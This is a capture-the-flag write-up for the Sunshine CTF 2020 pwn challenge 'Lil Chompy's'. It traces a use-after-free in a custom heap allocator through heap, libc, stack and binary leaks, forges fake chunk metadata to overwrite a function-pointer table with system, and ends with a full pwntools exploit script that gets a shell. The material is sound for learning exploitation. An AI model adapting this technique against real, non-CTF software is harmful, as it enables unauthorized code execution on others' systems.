# Sunshine CTF 2020 - Lil Chompy's

#### - **Category** : Pwn  
#### - **Points** : 700 Pts  
#### - **Solves** : 3

### Description

While browsing around some Shodan queries, I stumbled across an access
terminal to a theme park designer tool hosted by BSides Orlando! It appears
that the filthy organizers are trying to contract someone to design a new park
for them called Lil Chompy's. Everyone loves Lil Chompy the gator, but I think
he deserves to live freely outside of an alligator pit!

Help me free Lil Chompy from the clutches of those BSides Orlando fools by
gaining access to their server so we can halt planning and construction of
this theme park!

```  
nc chal.2020.sunshinectf.org 20003  
```

Note:

You can run the exact Docker container (w/o the flag of course) as is running
on the challenge server with this command:

```  
docker run -p 20003:20003 -itd kjcolley7/lilchompys-redacted:release  
```

There's also the `debug` tag which swaps out `lilchompys` with a version of it
built with `CHOMPY_DEBUG=1` (in the archive as `lilchompys.debug`):

```  
docker run -p 20003:20003 -itd kjcolley7/lilchompys-redacted:debug  
```

### Files

- lilchompys-libc.so (Ubuntu GLIBC 2.23-0ubuntu11.2)  
- lilchompys  
- lilchomys.debug  
- libcageheap.so  
- lilchompys.c  
- heap_internal.h  
- heap.h  
- heap.c  
- heap_debug.c  
- heap_debug.h  
- Dockerfile  
- compat.h  
- compat.c  
- Build.mk  
- BUILDING.md

### Analysis

*Side note*: During the exploitation phase of this binary, I personally did not go in depth into any of the heap files to see how the heap was being created and handled. I also didn't utilize much of the debugger functionality to view the linked lust like structure of the currently allocated/deallocated chunks. This was kind of disheartening as the author definitely put time and dedication into the creation of the challenge and I just didn't take to time to figure it all out and got lucky in my opinion.

Based on the large number of files and their names, we can ascertain that this
challenge will involve some kind of heap exploitation but with a custom heap
implementation. Running the binary we are greeted with a password prompt,
thankfully we don't need to reverse the entire program but can just look at
the source code to see that the password is `lilChompy2020!`. From here we are
given the main program loop with several options:

```  
1) View theme park  
2) Add new attraction  
3) Demolish an existing attraction  
4) Rename an existing attraction  
5) Submit finalized theme park design for review  
```

View theme park: Will display the current allocations out of the 20 possible
and the strings at those locations.

Add New Attraction: Allows for the creation of an attraction, this involves
mallocing two chunks, one of the size of an attraction struct, then one of the
size of a string that is sent in, this can range from 0-50 characters in
length. Then the string is set inside the second chunk. The type of attraction
is also set this will range from 1-8.

Demolish: You choose a lot to destroy, both malloced chunks are freed, and the
saved pointer to that lot is set to 0

Rename: Choose a lot to rename, this will free the name, then allow you to
send in a new string and malloc a new chunk to fit the new string, same size
restrictions are in affect. There is one check though, to see if your new
string starts with a null byte and if so, will return before the new chunk is
malloced

Submit: So the submit walks through our list of attractions and will call
different functions based off the type of attraction it is, 1-8 again, the
parameter to this function will be the name and the index.

Attraction Struct:

```  
typedef struct Attraction {  
	FunKind kind;  
	char* name;  
} Attraction;  
```

Submit function list:

```  
static OnSubmitFunc* submitFuncs[] = {  
	&onSubmitRollerCoaster,  
	&onSubmitWaterRide,  
	&onSubmitCarnivalRide,  
	&onSubmitSkillGame,  
	&onSubmitArcadeGame,  
	&onSubmitLiveShow,  
	&onSubmitHauntedHouse,  
	&onSubmitAlligatorPit,  
};  
```

Last important note, is that whenever input is read in it is always read into
a static buffer space of 50 characters, except for the beginning password,
which is read into it's own buffer of 50 characters, this will be important to
know for later.

### Tinkering

For some tinkering I created some chunks to see how they look in memory,
creating 2 attractions one a roller coaster (1) and the other a water ride(2)

```  
gef➤  x/18gx 0x00007ffff7fe7020  
0x7ffff7fe7020: 0x0000000000000001      0x00007ffff7fe7040  
0x7ffff7fe7030: 0x000000000007fffe      0x00000000000ffffd  
0x7ffff7fe7040: 0x6161616161616161      0x6161616161616161  
0x7ffff7fe7050: 0x0000000000006161      0x0000000000000000  
0x7ffff7fe7060: 0x000000000007fffd      0x00000000000ffffe  
0x7ffff7fe7070: 0x0000000000000002      0x00007ffff7fe7090  
0x7ffff7fe7080: 0x000000000007fffe      0x00000000000ffffe  
0x7ffff7fe7090: 0x6262626262626262      0x0000000000006262  
0x7ffff7fe70a0: 0x000000000007fffe      0x000000000007ff0b  
```

Looking at the heap we can see where the two attractions are actually at, with
0x7ffff7fe7020 being the first attraction having the string point to the chunk
right after it, then the second being at 0x7ffff7fe7070. What is a bit
confusing is what kind of meta data is being used here, now it would probably
have been more beneficial to read through the heap.c file to figure out the
exact values of how it works, but after some testing it appears that the
ending bytes determine what size is being used, here is a small table of the
values

| Reported Value | Chunk Size (bytes) |  
| :------------: | :----------------: |  
|    0xffffe     |        0x20        |  
|    0xffffd     |        0x30        |  
|    0xffffc     |        0x40        |

The list goes on but we aren't able to compute any chunks larger, without
extra work, because of the input limitations. Now what is the difference
between 0x7f and 0xff, to be perfectly honest I'm not quite sure but we will
discuss it a bit later.

Some of you may have noticed the main bug here but for those of you who
haven't, it is within the rename capability. By sending in a new name of
'\x00' or just enter, our chunk gets freed but is never removed from our
attraction struct object. Allowing for a use after free attack. This can be
done with sending in between 1 and 16 'a's then renaming the attraction with
an empty string.

```  
0x7efc9ee03020: 0x0000000000000001      0x00007efc9ee03040
<---  
0x7efc9ee03030: 0x000000000007fffe      0x00000000000ffffe  
0x7efc9ee03040: 0x4141414100000001      0x00007efc9ee03060
<---  
0x7efc9ee03050: 0x000000000007fffe      0x00000000000ffffe  
0x7efc9ee03060: 0x6262626262626262      0x6262626262626262  
0x7efc9ee03070: 0x000000000007fffe      0x000000000007ff08  
```

Now our name points the head of our second attraction as shown above.

### Exploitation

Before we really get into the exploitation we need to set a straight target,
after the tinkering and the quick looking through the heap files we probably
wouldn't be able to use any hooks, or overwrite the got within libcage as
there weren't any functions that looked great for it. What we could do though
is to overwrite the function list with a pointer to system and when the
corresponding function is called within the submit function with a name of
/bin/sh we should get a shell.

Now that we have an exploit method and a target, we still need to find a leak
to gain something further, but since we have this use after free we can just
keep utilizing this to leak the address of the second attractions name. By
renaming the first attraction again and sending in 8 characters, when view is
called it should print our 8 characters and then the leak

```  
$ 1  
Lot #1: aaaaaaaa`\x90\x1f\x85\xb2\x7f (roller coaster)  
[*] Got EOF while reading in interactive  
```

Crap. It turns out the view function still uses the number to figure out what
string to print after, in the case of the first attraction this is a 1 or
`roller coaster` and filling this value with all a's will definitely overflow
the array causing our segfault that occurs. An easy remediation to this would
be to make the value negative 1 so that when the array is indexed it is still
within program space. Like so:

```  
$ 1  
Lot #1: \xff\xff\xff\xff\xff\xff\xff\xff`\x10e6\x83\x7f (roller coaster)  
Lot #2: bbbbbbbbbbbbbbbb\xfe\xff\x07 ((null))  
```

So we now have the first leak but where can we go from here? After some
testing I found that from this point on the libc would need to be used, I had
worked on this challenge before the official libc was released but I was able
to just pull it and the ld-2.23.so from the docker image, as well as get the
docker image up for testing. But for those interested in the future the tool
patchelf was used so I didn't need to dynamically load the library myself
every time, `patchelf --set-rpath ./ --force-rpath --set-interpreter
./ld-2.23.so ./lilchompys` now the libc just needs to be renamed to libc.so.6
in the current directory and lilchompy will run entirely on 2.23 technology.

In GDB, I noticed that the libcageheap.so was located at a static offset from
our allocated heap chunk with an offset of 0x5000 on my local tests and of
0x2000 on the remote tests, libc was also at a static offset locally but I
couldn't find it when testing through the docker environment. I also didn't
try too hard either, but now that during this writing I became curious and
wanted to know the truth, as it turns out the offset was off by 0x2000 for
remote and local, so at location 0x5de000 and 0x5e0000 respectively.

The reason this is important is because there are most likely pointers between
the different libraries and I was hoping for there to be a pointer to the
binaries base itself but as it would turn out we would need to take the long
way around. Anyways since we know where libcage is loaded we can find some
kind of pointer to libc inside libcage's got, at an offset of 0x7f40. Using
our rename functionality we can overwrite attraction 2's name pointer to this
value to get the libc leak. Sadly there was not a pointer straight to the
binary here either, but there is a pointer to the stack at the libc's environ
variable, which points to the list of environment strings loaded on the stack,
and on the stack there are bound to be binary addresses to leak.

Using the overwrite ability again we leak the stack, then finally after one
more leak we get the binaries location. Game over, right? So I wonder how well
this heap is actually set up, what if we just set the second attraction to
where we want to overwrite then rename attraction 2, this should free the
address  in the binary space and put it into our free list, then just allocate
it again with an overwrite.

```  
$ 3  
Enter the lot number of the amusement to demolish:  
$ 2  
[*] Got EOF while reading in interactive  
```

Well that's a bummer, connecting GDB shows that we are thrown an error through
the raise function meaning we were put here by a function call, so what if
there are some checks against just blind freeing, and the chunk needs to look
like a viable chunk, do we even control the ability for this? Here is what our
memory space looks like:

```  
gef➤  x/64gx 0x000055c93c25c020  
0x55c93c25c020 <password.3818>: 0x706d6f68436c696c      0x0000213032303279  
0x55c93c25c030 <password.3818+16>:      0x0000000000000000
0x0000000000000000  
...  
0x55c93c25c060 <funToString>:   0x000055c93c25a008      0x000055c93c25a012  
...  
0x55c93c25c0c0 <submitFuncs>:   0x000055c93c25991c      0x000055c93c25994c
<---  
...  
0x55c93c25c120 <line.3720>:     0x0000000000000001      0x000055c93c25c060
<---  
0x55c93c25c130 <line.3720+16>:  0x6262626262626200      0x6262626262626262  
```

At address `0x55c93c25c0c0` is where we want to overwrite, but what is above
it? The password string from before, unmodified from when we sent in our
previous string. Then down lower at address `0x55c93c25c120` we have remnant
data that we sent in with the creation of the second attraction originally.
What if we used these two buffers to make it seem like a chunk exists there.
So lets make the chunks look valid by putting the meta data between them. To
get as close to the funToString variable, since we can only send 50 characters
to the password we want to have the top of the chunk be at `0x55c93c25c040`
and the bottom at `0x55c93c25c130` or a chunk size of 0xf0, following the
table above we get our chunk to be `0xffff0`. So let's spray some of those in
there and check the results.

```  
gef➤  x/64gx 0x00005616e6e8f020  
0x5616e6e8f020 <password.3818>: 0x706d6f68436c696c      0x0000213032303279  
0x5616e6e8f030 <password.3818+16>:      0x0000000000000000
0x0000000000000000  
0x5616e6e8f040 <password.3818+32>:      0x00000000000fffff
0x00000000000ffffe  
0x5616e6e8f050 <password.3818+48>:      0x6161616161616161
0x0000000000006161                      <---  
0x5616e6e8f060 <funToString>:   0x000000000007fffe      0x000000000007fff2  
...  
0x5616e6e8f130 <line.3720+16>:  0x00000000000fff00      0x00000000000ffff0  
```

At the arrow, we can see that we now have a new chunk with 'a's in there, and
we can see that the chunk metadata changed resulting in corruption of the
funToString variable as well. Which will be called in various function
depending on the attraction type so, it is best to make sure that the first is
safe, just to be sure. Any address will work, as long as the program can read
that memory address, I used the binary base.

Since we don't quite have enough characters to write all the way to
submitFuncs we just need to create one more attraction and then we can get the
overwrite we need.

```  
0x5627ec18b0c0 <submitFuncs>:   0x00007fea2806e3a0      0x00005627ec18894c

gef➤  print &system  
$1 = (<text variable, no debug info> *) 0x7fea2806e3a0 <system>  
```

Now all that is left is to rename the first variable to ''/bin/sh' then submit
our design for a shell!

```  
$ 5  
The theme park design has been submitted! Let's take a look at the expected
park experience.  
$ ls  
flag.txt  
libcageheap.so  
lilchompys  
$ id  
uid=1000(lilchompys) gid=1000(lilchompys) groups=1000(lilchompys)  
```

### Afterwards

I may have lucked out in my exploit overall and I think that is a shame for
all the hard work that was put in to create this challenge. I think the idea
and design is great but user stupid/luck always triumphs.

I went back a bit and looked into the free function and it looks like there
are some checks to see if the next chunk or previous chunk are free and to
consolidate them if they are, which crashes our attempt on some post tests. By
sending the 0xffff0, apparently we made it think that both chunks are in use
and to not do any other checks.

### Code

```python  
from pwn import*

DEBUG = 1  
off2 = 0x7f40

if DEBUG == 0:  
   p = process('./lilchompys')  
   offset = 0x5000  
else:  
   p = remote("chal.2020.sunshinectf.org",20003)  
   offset = 0x2000 #7-2 = 5

p.sendline('lilChompy2020!\x00\x00' + p64(0xffff0) + p64(0xffff0)
+p64(0xfffff) + p64(0xffff0))

def send(a,b):  
   p.sendlineafter(a,str(b),timeout=1)

def view():  
   send("5) S", 1)

def add(t, name):  
   send("5) Submit", 2)  
   send("8) Alligator", t)  
   send(":\n", name)

def demolish(lot):  
   send("5) S", 3)  
   send("ish:", lot)

def rename(lot, name):  
   send("5) S", 4)  
   send(":\n", lot)  
   send(":\n", name)

#leak heap address  
add(1, 'A'*16) #1  
rename(1,'')  
add(1, 'b'*16) #1  
rename(1,'\xff'*8)  
view()  
p.readuntil('\xff'*8)  
leak = p.readuntil(' (')[:-2]  
heap = u64(leak + '\x00'*(8-len(leak)))-0x60  
print hex(heap)

#leak libc  
rename(1,"")  
add(1,'a'*16)  
rename(1,p64(1)+p64(heap+offset+off2))  
view()  
p.readuntil('#2: ')  
leak = p.readuntil(' (')[:-2][:8]  
libc = u64(leak + '\x00'*(8-len(leak)))-0x101740  
print "libc", hex(libc)

#leak stack  
environ = libc+0x3c6f38  
rename(1,p64(1)+p64(environ))  
view()  
p.readuntil('#2: ')  
leak = p.readuntil(' (')[:-2][:8]  
stack = u64(leak + '\x00'*(8-len(leak)))  
print "stack", hex(stack)

#leak binary  
rename(1,p64(1)+p64(stack -0x100))  
view()  
p.readuntil('#2: ')  
leak = p.readuntil(' (')[:-2][:8]  
binary = (u64(leak + '\x00'*(8-len(leak)))&0xfffffffffffff000)-0x1000

system=libc+0x453a0  
fun = binary+0x4060

print "binary", hex(binary)

#get overwrite of function pointers  
add(1, p64(0xffff0)*6)  
rename(1,p64(1)+p64(fun-16))  
demolish(2)  
add(1,p64(binary)*6)  
add(1,p64(binary)*2+p64(system))

#get the first item to sh to get shell with system call  
rename(1,"/bin/sh\x00")

#submit the park for a shell

p.interactive()  
```

Original writeup
(https://github.com/kernelpoppers/ctf_writeups/tree/master/Sunshine_2020/Lil_Chompy).